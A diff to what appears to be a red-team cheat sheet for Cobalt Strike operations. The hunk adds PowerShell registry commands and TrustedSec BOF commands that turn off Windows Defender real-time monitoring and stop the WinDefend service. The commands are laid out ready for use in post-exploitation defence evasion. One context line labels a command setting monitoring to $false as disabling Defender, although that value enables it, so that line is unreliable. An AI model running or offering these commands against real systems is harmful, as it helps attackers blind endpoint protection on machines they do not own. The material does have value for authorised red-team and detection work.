@@ -487,8 +487,19 @@ Cobalt Strike's hail-mary unhooking function. "This is a Beacon Object File to r
 powershell Set-MpPreference -DisableRealtimeMonitoring $false --> Attempt to disable Defender
 powershell Get-MpPreference --> Check if RealTimeMonitoring is disabled
 
+# Disabling Defender via Windows Registry
+powershell Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+powershell Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableRealTimeMonitoring -Value 1
+
 # Disable Defender via Windows Registry using TrustedSec Remote Operations BOFs
 reg_set HKLM "SOFTWARE\Policies\Microsoft\Windows Defender" DisableRealTimeMonitoring REG_DWORD 1
+```
+
+# Disable Defender Service
+```
+# Disable Defender Service using TrustedSec Remote Operations BOFs
+sc_stop WinDefend
+sc_qc WinDefend
 ```
 
 ### Disabling Tanium 
